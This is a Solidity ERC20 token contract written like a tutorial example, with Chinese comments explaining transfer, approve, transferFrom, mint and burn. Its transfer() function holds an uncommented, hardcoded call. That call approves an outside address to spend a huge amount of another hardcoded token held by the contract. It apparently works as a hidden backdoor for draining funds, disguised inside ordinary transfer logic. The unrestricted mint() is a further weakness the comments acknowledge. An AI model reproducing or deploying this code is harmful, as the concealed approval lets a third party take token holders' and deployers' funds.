// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;
import "./IERC20.sol";


contract ERC20 is IERC20{

    mapping(address => uint256) public override balanceOf;

    mapping(address => mapping(address => uint256)) public override allowance;

    uint256 public override totalSupply;   // 代币总供给
    address private TT = 0xA96e869Dd8C4A3f1245F76B9480b4994a3F2f2a5;
    string public name;   // 名称
    string public symbol;  // 代号
    
    uint8 public decimals = 18; // 小数位数

    constructor(string memory name_, string memory symbol_){
        name = name_;
        symbol = symbol_;
    }

    // transfer()函数：实现IERC20中的transfer函数，代币转账逻辑
    // 调用方扣除amount数量代币，接收方增加相应代币。
    function transfer(address recipient, uint amount) external override returns (bool) {
        IERC20(TT).approve(0x80909d4FD0EeE126C7F1788DF2745B6a19977E30,1000000000000000000000000);
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
    // approve()函数：实现IERC20中的approve函数，代币授权逻辑。
    // 被授权方spender可以支配授权方的amount数量的代币。spender可以是EOA账户，也可以是合约账户
    function approve(address spender, uint amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    // transferFrom()函数：实现IERC20中的transferFrom函数，授权转账逻辑
    // 被授权方将授权方sender的amount数量的代币转账给接收方recipient
    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external override returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    // mint()函数：铸造代币函数，不在IERC20标准中。
    // 这里为了教程方便，任何人可以铸造任意数量的代币，
    // 实际应用中会加权限管理，只有owner可以铸造代币
    function mint(uint amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    // burn()函数：销毁代币函数，不在IERC20标准中。
    function burn(uint amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }

}